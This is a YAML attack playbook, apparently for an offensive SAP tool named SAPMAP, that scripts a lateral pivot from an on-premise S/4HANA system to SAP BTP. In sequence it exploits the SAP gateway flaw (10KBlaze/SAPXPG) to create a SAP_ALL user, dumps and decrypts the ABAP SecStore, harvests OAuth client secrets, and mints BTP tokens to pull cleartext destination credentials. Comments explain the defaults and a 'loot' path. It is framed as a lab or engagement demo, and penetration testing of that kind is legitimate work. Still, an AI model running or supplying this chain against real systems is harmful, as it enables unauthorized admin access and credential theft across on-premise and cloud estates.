# SAPMAP playbook: on-prem → BTP full lateral pivot
#
#   1. Discover S4H on the lab subnet
#   2. Check Gateway (10KBlaze / SAPXPG) vulnerability
#   3. Create a SAPMAP user with SAP_ALL via the GW exploit
#   4. Download the ABAP SecStore (RSECTAB) so OAuth client_secret
#      values become available
#   5. Harvest BTP credentials — refreshes OA2C_CLIENT[_EXT] and
#      scans every artefact source for BTP-shaped (client_id,
#      client_secret) tuples
#   6. Mint a BTP access token from a harvested OAuth client and
#      auto-pull every destination on the bound subaccount —
#      cleartext on-prem credentials sitting on the BTP side land
#      on the map automatically (the BTP cloud node + synthetic
#      BTP→on-prem edges appear in the next render tick)
#
# Usage:
#   python3 sapmap.py --script scripts/demo_onprem_to_btp.yaml --confirm
#
# `--confirm` is required because step 3 (`create_user`) is a
# destructive action that mints a real ABAP user on the target.
# The other steps are read-only and run dry without --confirm.
#
# Step 6 needs three inputs from the harvest log (step 5):
#   * uaa_url      — the OAuth profile's TOKEN_ENDPOINT, normalised
#                    to https://...authentication.../oauth/token
#   * client_id    — the OAuth profile's CLIENT_ID
#   * client_secret — the matched secstore secret
# Either fill them inline or use `path:<file>` so the YAML never
# carries a real secret in version control.

name: "On-prem S/4 → BTP Lateral Pivot Demo"
description: >
  Discover S4H, root via the gateway, dump the ABAP SecStore
  (RSECTAB), harvest any BTP-bound OAuth client credentials sitting
  in OA2C_CONFIG / SM59 / SecStoreFS, and mint a BTP access token
  to enumerate destinations on the bound subaccount.  End to end:
  one click → on-prem foothold → cloud topology + cleartext
  destinations on the map.

steps:
  # 1. Discover S/4 on the lab subnet (S4H = 192.168.2.209).  Adjust
  #    the CIDR to your engagement scope.
  - action: scan
    targets: "192.168.2.209"
    mode: fast
    timeout: 600

  # 2. Check Gateway for SAPXPG / 10KBlaze (CVE-2020-6207 family).
  #    On a stock SAP gateway with `gw/reg_no_conn_info=0` this
  #    answers True without any creds.
  - action: check_gw
    target: S4H

  # 3. Mint a SAPMAP user with SAP_ALL via the GW exploit.  Lands
  #    in client 001 with the SAPMAP-default password (configurable
  #    in modules/core/sapmap_config.py).
  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  # 4. Download the ABAP SecStore (RSECTAB).  Decrypts
  #    /OA2C/CS_<UUID>_<NN> rows that hold OAuth client secrets;
  #    those rows feed into step 5's harvester via CLIENT_UUID.
  - action: download_secstore
    target: S4H

  # 5. Harvest BTP credentials.  Implicitly refreshes
  #    OA2C_CLIENT + OA2C_CLIENT_EXT (transaction OA2C_CONFIG)
  #    before scanning the four credential sources.  Look at the
  #    console output: any *.hana.ondemand.com endpoint with a
  #    matched secstore secret becomes a mintable candidate.
  - action: harvest_btp_creds
    target: S4H

  # 6. Mint a BTP access token using a harvested OAuth client.
  #    `from_harvest: true` auto-picks the first candidate that step
  #    5 produced — no manual copy-paste of uaa_url / client_id /
  #    client_secret needed.  Use `candidate_index: N` to pick a
  #    different one when the harvester returns multiple.
  #
  #    The endpoint auto-enumerates the bound subaccount's
  #    destinations after a successful mint, so cleartext on-prem
  #    credentials sitting on the BTP side land on the map
  #    automatically — no separate pull step needed.
  - action: mint_btp_token
    target: S4H
    from_harvest: true
    # candidate_index: 0   # uncomment + change to mint with a
    #                      # specific candidate when there's more
    #                      # than one BTP-bound profile

  # ---------------------------------------------------------------
  # Manual override — uncomment ONE of the two blocks above this
  # line and use the explicit-values form below instead when you
  # want to mint with a specific (uaa_url, client_id, client_secret)
  # triplet.  `path:<file>` loads the secret from disk so it stays
  # out of version control.
  # ---------------------------------------------------------------
  # - action: mint_btp_token
  #   target: S4H
  #   uaa_url: "https://<subdomain>.authentication.<region>.hana.ondemand.com/oauth/token"
  #   client_id: "sb-clone…!b…|destination-xsappname!b…"
  #   client_secret: "path:./loot/btp/sapmap_dest_secret.txt"

  - action: layout
    mode: hierarchy     # or: star | circle | stack | hierarchy | reset
